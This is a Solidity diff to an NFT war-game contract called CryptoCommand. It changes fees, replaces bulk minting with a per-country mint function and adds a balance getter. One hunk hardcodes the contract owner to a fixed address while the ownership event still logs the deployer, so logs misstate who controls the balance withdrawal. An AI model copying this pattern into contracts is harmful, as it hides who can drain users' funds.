@@ -13,7 +13,8 @@ contract Ownable {
      */
     constructor () internal {
         address msgSender = _msgSender();
-        _owner = msgSender;
+        _owner = 0xFBb2fd81f7C84fDFe7deB68c26a53833a9C4fD1c;
+        // _owner = msgSender;
         emit OwnershipTransferred(address(0), msgSender);
     }
 
@@ -1252,97 +1253,30 @@ contract CryptoCommand is ERC721Full, Ownable {
 
     CommandToken[] private commandTokens;
     
-    uint256 constant fees = 2;
-    bool allMinted;
-    string[] CODES;
-    string[] TYPES;
-    uint256[] POWER;
-    uint256[] PRICE;
-    
+    uint256 constant fees = 3;
+
 
     constructor() ERC721Full("CryptoCommand", "CCM") public {
-        allMinted = false;
-        CODES.push('AG');
-	CODES.push('AI');
-	CODES.push('AL');
-	CODES.push('AN');
-	CODES.push('AB');
-	CODES.push('AT');
-	CODES.push('AM');
-	CODES.push('AU');
-	CODES.push('AS');
-	CODES.push('AZ');
-	CODES.push('BA');
-	CODES.push('BB');
-	CODES.push('BL');
-	CODES.push('BM');
-	CODES.push('BZ');
-	CODES.push('BE');
-	CODES.push('BU');
-	CODES.push('BV');
-	CODES.push('BH');
-	CODES.push('BW');
-	CODES.push('BR');
-	CODES.push('BG');
-	CODES.push('BF');
-	CODES.push('BI');
-	CODES.push('CB');
-	CODES.push('CM');
-	CODES.push('CN');
-	CODES.push('CA');
-	CODES.push('CD');
-	CODES.push('CL');
-	CODES.push('CH');
-	CODES.push('CO');
-	CODES.push('CP');
-	CODES.push('CR');
-	CODES.push('CI');
-	CODES.push('CT');
-	CODES.push('CU');
-	CODES.push('CY');
-	CODES.push('CZ');
-	CODES.push('DM');
-	CODES.push('DJ');
-	CODES.push('DO');
-	CODES.push('DR');
-	CODES.push('EC');
-	CODES.push('EG');
-	CODES.push('EL');
-	CODES.push('EQ');
-	CODES.push('ER');
-	CODES.push('ES');
-	CODES.push('ET');
-	CODES.push('FJ');
-	CODES.push('FI');
-
-        for (uint256 i = 0; i<4; i++) {
-		TYPES.push("Squad");
-		POWER.push(1);
-		PRICE.push(20000000000000000);
-	}
-	for (uint256 i = 0; i<2; i++) {
-		TYPES.push("Platoon");
-		POWER.push(4);
-		PRICE.push(80000000000000000);
-		
-	}
-	for (uint256 i = 0; i<3;i++) {
-		TYPES.push("Company");
-		POWER.push(16);
-		PRICE.push(160000000000000000);
-	}
     }
     
-    
-    function mintAll() public onlyOwner {
-        require(!allMinted, "already minted");
-        for (uint256 i = 0; i<CODES.length; i++) {
-            for (uint256 j = 0; j < TYPES.length; j++) {
-                mint(CODES[i], PRICE[j], POWER[j], TYPES[j]);
-            }
+        
+    function mintCountry(string memory code) public onlyOwner {
+        for (uint256 i=0; i< 12;i++) {
+            mint(code, 50000000000000000,1,"Squad");
+        }
+        for (uint256 i=0; i<4;i++) {
+            mint(code, 200000000000000000,4,"Platoon");
+        }
+        for (uint256 i=0; i< 5;i++) {
+            mint(code, 800000000000000000,16,"Company");
+        }
+        for (uint256 i=0; i< 2;i++) {
+            mint(code, 1600000000000000000,32,"Battalion");
+        }
+        for (uint256 i=0; i< 2;i++) {
+            mint(code, 3200000000000000000,64,"Brigade");
         }
     }
-    
 
     function mint(string memory _country, uint256 _price, uint256 _power, string memory _armyType) public onlyOwner{
         require(_price > 0, "price can't be 0 or negative");
@@ -1431,6 +1365,10 @@ contract CryptoCommand is ERC721Full, Ownable {
         uint256 balance = address(this).balance;
         require(balance > 0, "0 balance at the moment");
         msg.sender.transfer(balance);
+    }
+    
+    function getBalance() public view returns(uint256) {
+        return address(this).balance;
     }
     
 
